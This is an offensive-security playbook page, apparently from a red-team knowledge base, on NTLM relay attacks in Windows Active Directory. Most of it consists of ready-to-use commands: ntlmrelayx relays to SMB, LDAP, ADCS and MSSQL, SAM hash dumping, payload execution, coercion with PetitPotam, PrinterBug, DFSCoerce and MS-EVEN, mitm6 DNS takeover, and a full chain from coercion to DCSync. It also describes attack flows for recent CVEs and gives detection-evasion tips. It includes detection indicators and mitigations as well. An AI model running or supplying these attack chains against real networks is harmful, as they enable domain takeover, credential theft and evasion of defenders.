# NTLM Relay for Lateral Movement

> **MITRE ATT&CK**: Lateral Movement > T1557 - Adversary-in-the-Middle
> **Platforms**: Windows (Active Directory environments)
> **Required Privileges**: Network access (no domain credentials required for initial relay)
> **OPSEC Risk**: Medium-High

## Strategic Overview

NTLM relay attacks allow an attacker to intercept NTLM authentication from one host and forward it to another service, effectively authenticating as the victim without knowing their password or hash. This technique is uniquely powerful because it can provide initial foothold escalation and lateral movement simultaneously -- a machine account or privileged user coerced into authenticating to the attacker can be relayed to gain access to entirely different services. The modern NTLM relay landscape has evolved far beyond simple SMB-to-SMB relays. Chaining coercion techniques (PetitPotam, PrinterBug, DFSCoerce) with relay targets (LDAP, ADCS, MSSQL) creates devastating attack chains that can lead from zero credentials to domain compromise. The primary prerequisite is identifying targets where SMB signing is not required (for SMB relay) or finding HTTP/LDAP targets that accept NTLM without additional protections. A red team lead must master the coercion-relay-exploitation pipeline as it represents one of the highest-impact attack paths in Active Directory.

### Prerequisites Checklist

1. Identify targets without SMB signing (for SMB relays)
2. Identify coercion vectors available on the network
3. Determine relay targets (LDAP, ADCS, MSSQL, SMB)
4. Position attacker machine to intercept traffic (ARP spoof, LLMNR/NBT-NS, mitm6)

## Technical Deep-Dive

### 1. Reconnaissance -- Finding Relay Targets

```bash
# Find hosts with SMB signing disabled (required for SMB relay targets)
crackmapexec smb 192.168.1.0/24 --gen-relay-list nosigning.txt

# Nmap SMB signing check
nmap --script smb2-security-mode -p 445 192.168.1.0/24

# Check for ADCS web enrollment (HTTP relay target -- no signing needed)
crackmapexec http 192.168.1.0/24 -M adcs

# Identify LDAP signing requirements
crackmapexec ldap dc01 -u '' -p '' -M ldap-checker
```

### 2. Relay to SMB (Classic Relay)

```bash
# Set up ntlmrelayx to relay captured NTLM auth to SMB targets
ntlmrelayx.py -tf nosigning.txt -smb2support

# With command execution
ntlmrelayx.py -tf nosigning.txt -smb2support -c "whoami > C:\\Windows\\Temp\\relayed.txt"

# With interactive SMB shell
ntlmrelayx.py -tf nosigning.txt -smb2support -i
# Connects to interactive shell: nc 127.0.0.1 11000

# Dump SAM hashes from relayed hosts
ntlmrelayx.py -tf nosigning.txt -smb2support --dump-sam

# Execute a specific binary via relay
ntlmrelayx.py -tf nosigning.txt -smb2support -e /tmp/payload.exe

# Note: Cannot relay NTLM back to the originating host (MS08-068 fix)
# The relay target must be a DIFFERENT host than the one being coerced
```

### 3. Relay to LDAP/LDAPS (RBCD Attack)

```bash
# Relay to LDAP for Resource-Based Constrained Delegation attack
# Creates a new computer account and configures RBCD on the target
ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access --escalate-user attacker$

# This modifies the msDS-AllowedToActOnBehalfOfOtherIdentity attribute
# on the coerced machine, allowing the attacker's machine account to
# impersonate any user to that machine

# After successful relay:
# Step 1: Request service ticket via S4U
getST.py corp.local/attacker\$:'Password123'@dc01.corp.local -spn cifs/target.corp.local -impersonate administrator -dc-ip 192.168.1.10

# Step 2: Use the ticket
export KRB5CCNAME=administrator.ccache
psexec.py corp.local/administrator@target.corp.local -k -no-pass

# Relay to LDAP with shadow credentials
ntlmrelayx.py -t ldaps://dc01.corp.local --shadow-credentials --shadow-target target$
```

### 4. Relay to ADCS (ESC8 -- HTTP Enrollment)

```bash
# Relay NTLM to Active Directory Certificate Services web enrollment
# This is extremely powerful -- can obtain certificates for machine accounts
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template DomainController

# For machine account relay (e.g., relaying a DC's authentication)
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template Machine

# After obtaining the certificate (PFX):
# Use it for PKINIT authentication to get the NT hash
certipy auth -pfx dc01.pfx -dc-ip 192.168.1.10

# If relaying a Domain Controller's auth:
# The resulting certificate allows DCSync
secretsdump.py corp.local/dc01\$@dc01.corp.local -k -no-pass
```

### 5. Relay to MSSQL

```bash
# Relay to MSSQL for command execution
ntlmrelayx.py -t mssql://sql01.corp.local -q "EXEC xp_cmdshell 'whoami'"

# Relay for data extraction
ntlmrelayx.py -t mssql://sql01.corp.local -q "SELECT name FROM master.dbo.sysdatabases"

# Interactive MSSQL shell
ntlmrelayx.py -t mssql://sql01.corp.local -i
```

### 6. Coercion Techniques (Triggering NTLM Authentication)

```bash
# PetitPotam -- Coerce NTLM auth via EfsRpcOpenFileRaw (unauthenticated on unpatched DCs)
python3 PetitPotam.py attacker_ip dc01.corp.local

# Authenticated PetitPotam (works even on patched systems with valid creds)
python3 PetitPotam.py attacker_ip dc01.corp.local -u user -p pass -d corp.local

# PrinterBug (SpoolSample) -- Coerce auth via MS-RPRN
python3 printerbug.py corp.local/user:pass@dc01.corp.local attacker_ip

# DFSCoerce -- Coerce auth via MS-DFSNM
python3 DFSCoerce.py -u user -p pass -d corp.local attacker_ip dc01.corp.local

# ShadowCoerce -- Coerce auth via MS-FSRVP
python3 ShadowCoerce.py -u user -p pass -d corp.local attacker_ip dc01.corp.local

# Coercer -- Automated coercion tool that tries multiple methods
coercer coerce -u user -p pass -d corp.local -t dc01.corp.local -l attacker_ip
```

### 7. mitm6 + NTLM Relay (IPv6 DNS Takeover)

```bash
# mitm6 poisons IPv6 DNS responses, becoming the default DNS/WPAD server
# Combined with ntlmrelayx, captures NTLM auth from WPAD requests

# Terminal 1: Start mitm6 (IPv6 DNS takeover)
mitm6 -d corp.local --ignore-nofqdn

# Terminal 2: Start ntlmrelayx targeting LDAP
ntlmrelayx.py -6 -t ldaps://dc01.corp.local --delegate-access -wh wpad.corp.local

# How it works:
# 1. mitm6 responds to DHCPv6 requests, setting attacker as DNS server
# 2. Victims query attacker for WPAD configuration
# 3. Attacker returns WPAD file that triggers NTLM authentication
# 4. NTLM auth is relayed to LDAP to create computer accounts / modify delegation
```

### 8. WebDAV + NTLM Relay

```bash
# WebDAV-triggered NTLM auth can be relayed even to targets WITH SMB signing
# because WebDAV uses HTTP, not SMB -- different signing requirements

# Check for WebDAV enabled on targets
crackmapexec smb 192.168.1.0/24 -u user -p pass -M webdav

# Coerce WebDAV auth (target must have WebClient service running)
# The UNC path must use a hostname (not IP) to trigger WebDAV instead of SMB
python3 PetitPotam.py attacker@80/test target.corp.local

# ntlmrelayx listening for WebDAV relay
ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access

# Start WebClient service remotely (if not running)
# Publish a searchConnector-ms file on a writable share
```

### 9. Complete Attack Chain: PetitPotam to Domain Admin

```bash
# Step 1: Identify ADCS with HTTP enrollment
crackmapexec http 192.168.1.0/24 -M adcs

# Step 2: Start ntlmrelayx targeting ADCS
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template DomainController

# Step 3: Coerce Domain Controller authentication
python3 PetitPotam.py attacker_ip dc01.corp.local

# Step 4: ntlmrelayx captures DC's NTLM auth, relays to ADCS, obtains DC certificate
# Output: Certificate saved as dc01.pfx

# Step 5: Authenticate with the certificate to get DC's NT hash
certipy auth -pfx dc01.pfx -dc-ip 192.168.1.10
# Output: NT hash of DC01$ machine account

# Step 6: DCSync with the DC machine account hash
secretsdump.py corp.local/dc01\$@dc01.corp.local -hashes :DC_HASH
```

---

## 2025 NTLM Relay Renaissance

> The following techniques represent a resurgence in NTLM relay attacks despite Microsoft's
> deprecation efforts. SpecterOps published "The Renaissance of NTLM Relay Attacks" (April
> 2025) documenting why NTLM relay remains devastatingly effective. Key insight: NTLM
> deprecation is not removal -- Phase 3 (NTLM disabled by default) is not scheduled until a
> future release, with Phase 2 not even planned until H2 2026.

### 10. CVE-2025-54918: Partial MIC Removal (Critical)

```bash
# Critical vulnerability (patched September 9, 2025)
# Logic error in NTLM validation routine allows relay to signing-enforced services
# Affects Windows 10, 11, Server 2008-2025

# The vulnerability:
# By stripping the MIC AND the NTLMSSP SIGN/SEAL flags from AUTHENTICATE_MESSAGE,
# the target server accepts relayed auth without verifying integrity.
# Impact: Relay to LDAP/LDAPS and SMB even with signing required

# Attack flow:
# 1. Coerce NTLM auth (PetitPotam, PrinterBug, MS-EVEN)
# 2. Intercept NTLM exchange at relay position
# 3. Strip MIC field + NTLMSSP_NEGOTIATE_SIGN/SEAL flags from AUTHENTICATE_MESSAGE
# 4. Relay modified auth to target (LDAP, LDAPS, SMB)
# 5. Gain authenticated access as victim

# Particularly impactful on Windows Server 2025 / 24H2 builds
# Detection: Monitor for NTLM auth packets with removed SIGN/SEAL flags
# CrowdStrike released Falcon Next-Gen SIEM correlation rule template
```

### 11. CVE-2025-33073: NTLM Reflection via DNS Manipulation

```bash
# Discovered by Synacktiv (patched June 10, 2025)
# Reflective NTLM relay -- relays authentication BACK to the victim's own machine
# Achieves SYSTEM-level execution on targets without SMB signing

# Attack mechanism:
# 1. Create crafted DNS A record via LDAP or Dynamic DNS (default AD DNS permissions)
#    Hostname: localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
#    Points to: attacker IP
# 2. Crafted DNS name bypasses Windows loopback restriction checks
#    SMB client thinks it's a local connection
# 3. Coerce target to connect to this DNS name via SMB
# 4. SMB client authenticates to attacker's relay server
# 5. Relay reflects authentication back to target's own SMB service
# 6. Client uses local auth semantics, bypassing reflection protections
# Result: SYSTEM on target

# Impact: Any computer in the AD environment can be targeted
# Combined with CVE-2025-54918 (pre-patch) -> relay to signed services too

# Mitigation:
# - Enforce SMB signing on ALL clients and servers
# - Disable SMBv1
# - Restrict DNS zone permissions (block Authenticated Users from creating records)
```

### 12. MS-EVEN (EventLog) Authentication Coercion

```bash
# MS-EVEN is the Remote EventLog protocol (RPC)
# ElfrOpenBELW function coerces NTLM auth from target machine account
# Observed in real attacks: March 2025 Kaspersky Securelist report
# Attackers used MS-EVEN against healthcare Citrix/RODC servers

# Key characteristics:
# - Only requires network access (no special permissions)
# - RPC-based (harder to detect than SMB coercion)
# - Pairs with relay to LDAP, ADCS web enrollment (ESC8), or other services

# Usage: Coerce auth then relay
# Terminal 1: Start relay
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template Machine

# Terminal 2: Coerce via MS-EVEN (integrated into Coercer tool)
coercer coerce -u user -p pass -d corp.local -t target.corp.local -l attacker_ip --filter-protocol-name MS-EVEN

# Mitigation: netsh rpc filter to block coercion RPC methods
```

### 13. SCCM/MECM Relay Attacks

```bash
# SCCM remains a rich relay target due to default configurations

# Attack 1: Client Push Installation Relay
# When auto-assignment + client push enabled (no PKI certs required):
# SCCM server authenticates via NTLM to arbitrary endpoints
# Relay to LDAP for RBCD or to ADCS for certificate enrollment

# Attack 2: UNC Path Application Relay
# SCCM clients install apps from UNC paths -> send NetNTLMv2
# Control the UNC path via rogue distribution point -> capture and relay

# Attack 3: HTTP Relay via WebClient
# If WebClient service running: upgrade SMB coercion to HTTP auth
# HTTP auth can be relayed to LDAP/LDAPS (not subject to SMB signing)

# Mitigation:
# - Disable "Allow connection fallback to NTLM" in client push (enabled by default!)
# - Require PKI certificates for client auth
# - Enforce SMB signing + LDAP signing + channel binding
```

### 14. RelayKing -- Automated Relay Attack Surface Enumeration

```bash
# RelayKing (Depth Security, 2025)
# Comprehensive NTLM relay enumeration tool
# Scans 20,000+ hosts in ~23 minutes

# Capabilities:
# - Checks SMB, MSSQL, LDAP, LDAPS, HTTP, HTTPS for relay viability
# - Detects WebDAV WebClient service status
# - Identifies CVE-2025-33073 reflection vulnerability
# - Checks NTLMv1 support
# - Discovers unauthenticated coercion vectors (PetitPotam, PrinterBug, DFSCoerce)
# - Operates in authenticated AND unauthenticated (null session) modes

# Usage
relayking scan -t 192.168.1.0/24 -u user -p pass -d corp.local
relayking scan -t 192.168.1.0/24 --null-session  # Unauthenticated mode
```

### Why NTLM Relay Persists Despite Deprecation

```
# Key reasons (SpecterOps white paper, April 2025):

# 1. Deprecation ≠ Removal: NTLM remains present and functional
# 2. Legacy dependencies: Deeply embedded in enterprise applications
# 3. Inconsistent signing: Server 2025/Win11 require SMB signing; older do not
# 4. SMB signing ≠ relay protection: Server-side signing is in SMB headers
#    (which attacker controls), not in the NTLM exchange
# 5. LDAP needs BOTH signing AND channel binding: Without both, relay paths exist
# 6. New coercion methods: MS-EVEN, PetitPotam variants keep appearing
# 7. New vuln classes: CVE-2025-54918, CVE-2025-33073 undermine MIC protections
# 8. BloodHound integration: NTLM relay edges added in 2025 for attack path viz
```

---

## Detection & Evasion

### Detection Indicators

- **Event ID 4624** (Logon Type 3) where the source workstation name does not match the actual connecting IP
- NTLM authentication to services from unexpected network segments
- Multiple authentication attempts from the same source to different targets in rapid succession
- Unusual certificate enrollment requests in ADCS logs (Event ID 4886/4887)
- New computer accounts created via LDAP relay (Event ID 4741)
- IPv6 traffic anomalies (mitm6 indicator) in primarily IPv4 environments
- ARP cache changes or DHCPv6 responses from non-DHCP servers
- **NTLM AUTHENTICATE_MESSAGE with missing SIGN/SEAL flags** (CVE-2025-54918 indicator)
- **DNS record creation with anomalous hostnames** (CVE-2025-33073 indicator)
- **RPC connections to EventLog service from unexpected sources** (MS-EVEN coercion)

### Evasion Techniques

- Relay during periods of high authentication activity to blend into the noise
- Use targeted coercion (single host) rather than broadcast poisoning to reduce detection surface
- Prefer LDAP/ADCS relay targets over SMB (different monitoring coverage)
- Clean up created computer accounts and delegation configurations after exploitation
- When using mitm6, limit the attack duration to avoid persistent IPv6 DNS disruption
- Use WebDAV-based relay paths to bypass SMB signing requirements
- MS-EVEN coercion is RPC-based and harder to detect than SMB-based methods
- CVE-2025-33073 DNS records blend with legitimate dynamic DNS registrations

## Cross-References

- [Pass the Hash](pass-the-hash.md) -- Hashes obtained from relay-based SAM dumps feed into PtH
- [Pass the Ticket](pass-the-ticket.md) -- Tickets obtained via RBCD relay chains
- **ADCS Attacks** (12-active-directory-deep-dive/adcs-attacks.md) -- ESC8 relay to certificate enrollment
- **NTLM Theft** (07-credential-access/ntlm-theft.md) -- NTLM hash coercion and capture
- **Credential Guard Bypass** (07-credential-access/credential-guard-bypass.md) -- DumpGuard NTLMv1 extraction

## References

- https://attack.mitre.org/techniques/T1557/
- https://www.thehacker.recipes/ad/movement/ntlm/relay
- https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
- https://github.com/topotam/PetitPotam
- https://github.com/fox-it/mitm6
- https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
- SpecterOps: The Renaissance of NTLM Relay Attacks: https://posts.specterops.io/the-renaissance-of-ntlm-relay-attacks-everything-you-need-to-know-abfc3677c34e
- CrowdStrike: CVE-2025-54918 Analysis: https://www.crowdstrike.com/en-us/blog/analyzing-ntlm-ldap-authentication-bypass-vulnerability/
- Synacktiv: CVE-2025-33073 NTLM Reflection: https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection
- Depth Security: RelayKing: https://www.depthsecurity.com/blog/introducing-relayking-relay-to-royalty/
- Kaspersky: NTLM Abuse in 2025: https://securelist.com/ntlm-abuse-in-2025/118132/
